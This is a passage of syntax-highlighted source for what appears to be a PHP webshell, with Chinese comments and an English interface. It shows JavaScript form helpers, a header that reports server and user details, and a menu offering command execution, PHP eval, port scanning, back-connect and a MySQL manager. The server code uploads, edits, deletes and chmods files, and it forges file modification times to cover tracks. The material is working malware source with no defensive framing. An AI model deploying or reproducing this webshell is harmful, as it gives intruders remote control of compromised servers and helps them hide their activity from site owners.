</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (!tofile) return;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;copyfile&#39;).tofile.value = tofile;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;copyfile&#39;).sname.value = sname;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;copyfile&#39;).submit();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function rename(oldname) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            var newfilename;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            newfilename = prompt(&#39;Former file name:&#39; + oldname + &#39;\nPlease input new filename:&#39;, &#39;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (!newfilename) return;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;rename&#39;).newfilename.value = newfilename;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;rename&#39;).oldname.value = oldname;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;rename&#39;).submit();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function dofile(doing, thefile, m) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (m &amp;&amp; !confirm(m)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                return;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;filelist&#39;).doing.value = doing;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (thefile) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $(&#39;filelist&#39;).thefile.value = thefile;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;filelist&#39;).submit();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function createfile(nowpath) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            var filename;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            filename = prompt(&#39;Please input the file name:&#39;, &#39;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (!filename) return;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            opfile(&#39;editfile&#39;, nowpath + filename, nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function opfile(action, opfile, dir) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;fileopform&#39;).action.value = action;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;fileopform&#39;).opfile.value = opfile;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;fileopform&#39;).dir.value = dir;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;fileopform&#39;).submit();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function godir(dir, view_writable) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (view_writable) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $(&#39;godir&#39;).view_writable.value = view_writable;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;godir&#39;).dir.value = dir;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;godir&#39;).submit();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function getsize(getdir, dir) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;getsize&#39;).getdir.value = getdir;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;getsize&#39;).dir.value = dir;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;getsize&#39;).submit();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function editrecord(action, base64, tablename) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (action == &#39;del&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if (!confirm(&#39;Is or isn\&#39;t deletion record?&#39;)) return;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;recordlist&#39;).doing.value = action;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;recordlist&#39;).base64.value = base64;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;recordlist&#39;).tablename.value = tablename;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;recordlist&#39;).submit();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function moddbname(dbname) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (!dbname) return;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;setdbname&#39;).dbname.value = dbname;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;setdbname&#39;).submit();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function settable(tablename, doing, page) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (!tablename) return;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (doing) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $(&#39;settable&#39;).doing.value = doing;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (page) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $(&#39;settable&#39;).page.value = page;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;settable&#39;).tablename.value = tablename;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;settable&#39;).submit();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function s(action, nowpath, p1, p2, p3, p4, p5) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (action) $(&#39;opform&#39;).action.value = action;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (nowpath) $(&#39;opform&#39;).nowpath.value = nowpath;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (p1) $(&#39;opform&#39;).p1.value = p1;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (p2) $(&#39;opform&#39;).p2.value = p2;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (p3) $(&#39;opform&#39;).p3.value = p3;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (p4) $(&#39;opform&#39;).p4.value = p4;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (p5) $(&#39;opform&#39;).p4.value = p5;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function g(action, nowpath, p1, p2, p3, p4, p5) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (!action) return;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            s(action, nowpath, p1, p2, p3, p4, p5);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;opform&#39;).submit();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;body style=&#34;margin:0;table-layout:fixed; word-break:break-all&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    formhead(array(&#39;name&#39; =&gt; &#39;opform&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    makehide(&#39;action&#39;, $action);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    makehide(&#39;nowpath&#39;, $nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    makehide(&#39;p1&#39;, $p1);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    makehide(&#39;p2&#39;, $p2);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    makehide(&#39;p3&#39;, $p3);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    makehide(&#39;p4&#39;, $p4);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    makehide(&#39;p5&#39;, $p5);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    formfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if (!function_exists(&#39;posix_getegid&#39;)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $user = @get_current_user();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $uid = @getmyuid();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $gid = @getmygid();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $group = &#34;?&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $uid = @posix_getpwuid(@posix_geteuid());
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $gid = @posix_getgrgid(@posix_getegid());
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $user = $uid[&#39;name&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $uid = $uid[&#39;uid&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $group = $gid[&#39;name&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $gid = $gid[&#39;gid&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;table width=&#34;100%&#34; border=&#34;0&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;tr class=&#34;head&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;td&gt;&lt;span style=&#34;float:right;&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    &lt;?php echo @php_uname(); ?&gt; / User:
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    &lt;?php echo $uid . &#39; ( &#39; . $user . &#39; ) / Group: &#39; . $gid . &#39; ( &#39; . $group . &#39; )&#39;; ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;/span&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;?php echo $_SERVER[&#39;HTTP_HOST&#39;]; ?&gt; (
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;?php echo gethostbyname($_SERVER[&#39;SERVER_NAME&#39;]); ?&gt;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;/td&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;/tr&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;tr class=&#34;alt1&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;td&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;span style=&#34;float:right;&#34;&gt;PHP
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    &lt;?php echo PHP_VERSION; ?&gt; / Safe Mode:
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    &lt;?php echo getcfg(&#39;safe_mode&#39;); ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;/span&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;a href=&#34;javascript:g(&#39;logout&#39;);&#34;&gt;Logout&lt;/a&gt; |
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;a href=&#34;javascript:g(&#39;file&#39;);&#34;&gt;File Manager&lt;/a&gt; |
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;a href=&#34;javascript:g(&#39;mysqladmin&#39;);&#34;&gt;MYSQL Manager&lt;/a&gt; |
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;a href=&#34;javascript:g(&#39;sqlfile&#39;);&#34;&gt;MySQL Upload &amp; Download&lt;/a&gt; |
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;a href=&#34;javascript:g(&#39;shell&#39;);&#34;&gt;Execute Command&lt;/a&gt; |
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;a href=&#34;javascript:g(&#39;phpenv&#39;);&#34;&gt;PHP Variable&lt;/a&gt; |
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;a href=&#34;javascript:g(&#39;portscan&#39;);&#34;&gt;Port Scan&lt;/a&gt; |
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;a href=&#34;javascript:g(&#39;secinfo&#39;);&#34;&gt;Security information&lt;/a&gt; |
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;a href=&#34;javascript:g(&#39;eval&#39;);&#34;&gt;Eval PHP Code&lt;/a&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;?php if (!IS_WIN) { ?&gt; | &lt;a href=&#34;javascript:g(&#39;backconnect&#39;);&#34;&gt;Back Connect&lt;/a&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;?php } ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;/td&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;/tr&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/table&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;table width=&#34;100%&#34; border=&#34;0&#34; cellpadding=&#34;15&#34; cellspacing=&#34;0&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;tr&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;td&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $errmsg &amp;&amp; m($errmsg);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                // 获取当前路径
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if (!$dir) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $dir = $_SERVER[&#34;DOCUMENT_ROOT&#34;] ? $_SERVER[&#34;DOCUMENT_ROOT&#34;] : &#39;.&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $nowpath = getPath(SA_ROOT, $dir);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if (substr($dir, -1) != &#39;/&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $dir = $dir . &#39;/&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if ($action == &#39;file&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    // 判断读写情况
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $dir_writeable = @is_writable($nowpath) ? &#39;Writable&#39; : &#39;Non-writable&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    // 创建目录
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    if ($newdirname) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $mkdirs = $nowpath . $newdirname;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if (file_exists($mkdirs)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(&#39;Directory has already existed&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(&#39;Directory created &#39; . (@mkdir($mkdirs, 0777) ? &#39;success&#39; : &#39;failed&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            @chmod($mkdirs, 0777);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    // 上传文件
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    elseif ($doupfile) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        m(&#39;File upload &#39; . (@copy($_FILES[&#39;uploadfile&#39;][&#39;tmp_name&#39;], $uploaddir . &#39;/&#39; . $_FILES[&#39;uploadfile&#39;][&#39;name&#39;]) ? &#39;success&#39; : &#39;failed&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    // 编辑文件
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    elseif ($editfilename &amp;&amp; $filecontent) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $fp = @fopen($editfilename, &#39;w&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        m(&#39;Save file &#39; . (@fwrite($fp, $filecontent) ? &#39;success&#39; : &#39;failed&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        @fclose($fp);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    // 编辑文件属性
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    elseif ($pfile &amp;&amp; $newperm) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if (!file_exists($pfile)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(&#39;The original file does not exist&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $newperm = base_convert($newperm, 8, 10);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(&#39;Modify file attributes &#39; . (@chmod($pfile, $newperm) ? &#39;success&#39; : &#39;failed&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    // 改名
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    elseif ($oldname &amp;&amp; $newfilename) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $nname = $nowpath . $newfilename;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if (file_exists($nname) || !file_exists($oldname)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m($nname . &#39; has already existed or original file does not exist&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(basename($oldname) . &#39; renamed &#39; . basename($nname) . (@rename($oldname, $nname) ? &#39; success&#39; : &#39;failed&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    // 复制文件
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    elseif ($sname &amp;&amp; $tofile) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if (file_exists($tofile) || !file_exists($sname)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(&#39;The goal file has already existed or original file does not exist&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(basename($tofile) . &#39; copied &#39; . (@copy($sname, $tofile) ? basename($tofile) . &#39; success&#39; : &#39;failed&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    // 克隆时间
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    elseif ($curfile &amp;&amp; $tarfile) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if (!@file_exists($curfile) || !@file_exists($tarfile)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(&#39;The goal file has already existed or original file does not exist&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $time = @filemtime($tarfile);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(&#39;Modify file the last modified &#39; . (@touch($curfile, $time, $time) ? &#39;success&#39; : &#39;failed&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    // 自定义时间
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    elseif ($curfile &amp;&amp; $year &amp;&amp; $month &amp;&amp; $day &amp;&amp; $hour &amp;&amp; $minute &amp;&amp; $second) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if (!@file_exists($curfile)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(basename($curfile) . &#39; does not exist&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $time = strtotime(&#34;$year-$month-$day $hour:$minute:$second&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(&#39;Modify file the last modified &#39; . (@touch($curfile, $time, $time) ? &#39;success&#39; : &#39;failed&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    // 批量删除文件
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    elseif ($doing == &#39;delfiles&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if ($dl) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $dfiles = &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $succ = $fail = 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            foreach ($dl as $filepath) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                if (is_dir($filepath)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    if (@deltree($filepath)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        $succ++;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        $fail++;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    if (@unlink($filepath)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        $succ++;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        $fail++;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            }
